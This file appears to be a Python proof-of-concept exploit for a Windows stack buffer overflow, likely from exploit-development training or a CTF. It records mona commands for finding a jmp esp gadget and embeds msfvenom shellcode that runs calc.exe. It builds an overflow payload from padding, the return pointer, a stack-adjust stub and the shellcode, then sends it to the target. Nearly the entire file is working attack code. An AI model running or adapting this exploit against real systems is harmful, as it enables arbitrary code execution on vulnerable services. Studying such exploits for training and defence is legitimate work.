from constants import *

SUB_ESP_10 = b"\x83\xec\x10"

# !mona jmp -r esp -cpb "\x00\x0A"
# !mona jmp -r esp -cpb "badchars"

ptr_jmp_esp = b"\xc3\x14\x04\x08"

### Def shellcode
# msfvenom -p windows/exec CMD="calc.exe" -b '\x00\x0A' -f python -v shellcode EXITFUNC=thread

shellcode =  b""
shellcode += b"\xdb\xca\xbe\xd3\xaf\x95\xee\xd9\x74\x24\xf4"
shellcode += b"\x58\x33\xc9\xb1\x31\x31\x70\x18\x03\x70\x18"
shellcode += b"\x83\xc0\xd7\x4d\x60\x12\x3f\x13\x8b\xeb\xbf"
shellcode += b"\x74\x05\x0e\x8e\xb4\x71\x5a\xa0\x04\xf1\x0e"
shellcode += b"\x4c\xee\x57\xbb\xc7\x82\x7f\xcc\x60\x28\xa6"
shellcode += b"\xe3\x71\x01\x9a\x62\xf1\x58\xcf\x44\xc8\x92"
shellcode += b"\x02\x84\x0d\xce\xef\xd4\xc6\x84\x42\xc9\x63"
shellcode += b"\xd0\x5e\x62\x3f\xf4\xe6\x97\xf7\xf7\xc7\x09"
shellcode += b"\x8c\xa1\xc7\xa8\x41\xda\x41\xb3\x86\xe7\x18"
shellcode += b"\x48\x7c\x93\x9a\x98\x4d\x5c\x30\xe5\x62\xaf"
shellcode += b"\x48\x21\x44\x50\x3f\x5b\xb7\xed\x38\x98\xca"
shellcode += b"\x29\xcc\x3b\x6c\xb9\x76\xe0\x8d\x6e\xe0\x63"
shellcode += b"\x81\xdb\x66\x2b\x85\xda\xab\x47\xb1\x57\x4a"
shellcode += b"\x88\x30\x23\x69\x0c\x19\xf7\x10\x15\xc7\x56"
shellcode += b"\x2c\x45\xa8\x07\x88\x0d\x44\x53\xa1\x4f\x02"
shellcode += b"\xa2\x37\xea\x60\xa4\x47\xf5\xd4\xcd\x76\x7e"
shellcode += b"\xbb\x8a\x86\x55\xf8\x75\x65\x7c\xf4\x1d\x30"
shellcode += b"\x15\xb5\x43\xc3\xc3\xf9\x7d\x40\xe6\x81\x79"
shellcode += b"\x58\x83\x84\xc6\xde\x7f\xf4\x57\x8b\x7f\xab"
shellcode += b"\x58\x9e\xe3\x2a\xcb\x42\xca\xc9\x6b\xe0\x12"

### Def payload

payload = b""
payload += b"A"*offset
payload += ptr_jmp_esp
payload += SUB_ESP_10
payload += shellcode

send_payload(payload + b"\n")